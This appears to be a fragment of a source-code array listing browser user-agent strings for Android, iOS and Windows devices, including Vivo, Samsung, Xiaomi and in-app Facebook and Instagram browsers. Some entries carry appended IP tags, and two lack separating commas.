"Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.0.0",
"Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.2",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
"Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
"Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 12; V2130; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.3",
"Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1",
"Mozilla/5.0 (Linux; Android 12; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1",
"Mozilla/5.0 (Linux; Android 12; V2055; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3",
"Mozilla/5.0 (Linux; Android 10; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.2",
"Mozilla/5.0 (Linux; Android 12; V2058; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.4",
"Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; V2109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0",
"Mozilla/5.0 (Linux; Android 12; I2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.1.0.2",
"Mozilla/5.0 (Linux; Android 11; V2055A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/11.0.10.0",
"Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.4",
"Mozilla/5.0 (Linux; Android 12; V2061; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.12.3.1",
"Mozilla/5.0 (Linux; Android 12; V2038; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0",
"Mozilla/5.0 (Linux; Android 11; V2030; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/7.15.0.4",
"Mozilla/5.0 (Linux; Android 10; vivo 2015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 YaApp_Android/9.65 YaSearchBrowser/9.65",
"Mozilla/5.0 (Linux; Android 7.0; P028) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.80 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J106F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; RMX1921 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 YaBrowser/18.9.0.489.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ATU-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-P3100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X007D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; en-gb; Redmi Note 6 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2",
"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; BV9000Pro-F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Tesseract/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X; Tesseract/1.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; RAINBOW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.56 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; BLADE V8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A750FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X; Tesseract/1.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/8.0.57838 Mobile/11D167 Safari/9537.53",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.0.373.00 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; BTRS100284; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.1)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/46.0.2490.73 Mobile/12B466 Safari/600.1.4",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S6000L-F Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.92 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 YaBrowser/16.9.1.1616.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4X Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 YandexSearch/7.10",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; GTB7.4; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; eSobiSubscriber 2.0.4.16; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S650 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) YaBrowser/15.10.2454.3114.10 Mobile/11D169 Safari/9537.53",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; HPNTDF; InfoPath.1; .NET4.0C)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S660 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) GSA/3.1.0.23513 Mobile/11D201 Safari/8536.25",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.9.2246.119956",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S860 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 YaBrowser/13.9.1500.3524 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.1)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S960 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.2.339.00 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 74; BTRS105902; MRA 6.0 (build 5972); Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Me",
"Mozilla/5.0 (Linux; Android 4.2.2; M100qw Build/M100qw_001_16072013_001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Coast/3.0.3.78307 Mobile/11D201 Safari/7534.48.3",
"Mozilla/5.0 (Linux; Android 4.2.2; M100qw Build/master_lie for 4pda.ru 08.02.2014) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Safari/537.31",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36",
"TuneIn Radio/23.5.0; iPhone12,5; iOS/15.5"
"Mozilla/5.0 (Linux; Android 7.0; QPHONE_9.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; S58Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ELE-L29 Build/HUAWEIELE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/368.0.0.24.108;]",
"Mozilla/5.0 (Linux; Android 8.1.0; W_P200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:37.163.42.5]",
"Mozilla/5.0 (Linux; Android 9; VFD 730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Dalvik/2.1.0 (Linux; U; Android 9; POT-LX3 Build/HUAWEIPOT-L23)",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 440dpi; 1080x2110; Xiaomi/Redmi; M2003J15SC; merlinnfc; mt6768; it_IT; 378116740)",
"Mozilla/5.0 (Linux; Android 11; CPH2065 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 480dpi; 1080x2156; OPPO; CPH2065; OP4BDCL1; mt6873; it_IT; 378116740)",
"Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 Instagram 230.0.0.20.108 Android (28/9; 480dpi; 1080x2190; HUAWEI; ANE-LX1; HWANE; hi6250; it_IT; 363352028)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 240.1.0.26.107 (iPhone11,8; iOS 15_4_1; it_IT; it-IT; scale=2.00; 828x1792; 378200232) NW/1",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181) [ip:158.148.61.78]",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 240.1.0.26.107 (iPhone11,8; iOS 15_4_1; it_IT; it-IT; scale=2.00; 828x1792; 378200232)",
"Mozilla/5.0 (Linux; Android 10; Nokia 7 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:185.212.69.206]",
"Mozilla/5.0 (Android 10; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0 QwantMobile/4.2 [ip:5.102.4.47]",
"Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (31/12; 560dpi; 1440x2932; samsung; SM-G998B; p3s; exynos2100; it_IT; 378116730)",
"Mozilla/5.0 (Linux; Android 11; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:5.90.111.17]",
"Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36 OPT/2.9",
"Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181) [ip:158.148.48.68]",
"Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.57.169.8]",
"Mozilla/5.0 (Linux; Android 8.1.0; meizu M8 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; MAR-LX3A Build/HUAWEIMAR-L03A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 UCURSOS/v1.6_273-android",
"Mozilla/5.0 (Linux; Android 11; T766H_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:49.236.50.227]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/370.0.0.23.112;]",
"Mozilla/5.0 (Linux; Android 11; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:5.77.88.228]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 239.2.0.17.109 (iPhone10,5; iOS 15_5; it_IT; it-IT; scale=2.88; 1080x1920; 376668393)",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Dalvik/2.1.0 (Linux; U; Android 11; Nokia C21 Plus Build/RP1A.201005.001)",
"stagefright/1.2 (Linux;Android 4.4.4 Huawei T1-A21L T1-A21LV100R001C178B005)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.202.255]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (30/11; 440dpi; 1080x2167; Xiaomi/Redmi; 21061119DG; eos; mt6768; it_IT; 378116740)",
"Dalvik/2.1.0 (Linux; U; Android 10.0; Z40 Build/LMY47I)",
"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [ip:151.18.115.134]",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36 [ip:37.162.167.136]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [ip:193.207.219.189]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:37.163.34.229]",
"Mozilla/5.0 (Linux; Android 10; F2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:5.171.215.142]",
"TuneIn Radio/23.5.0; iPhone8,4; iOS/15.3.1",
"Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:188.153.103.130]",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.3.3606.65458",
"Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [ip:193.207.177.169]",
"Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [ip:151.38.134.181]"
"Mozilla/5.0 (Linux; Android 7.0; VIE-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.46.5.92]",
"Mozilla/5.0 (Linux; Android 12; CPH2207 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.2.3606.65175 [ip:185.82.168.15]",
"Dalvik/2.1.0 (Linux; U; Android 11; MiTV-AYFR0 Build/RTT0.211222.001)",
"Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:151.47.80.176]",
"Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; K5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
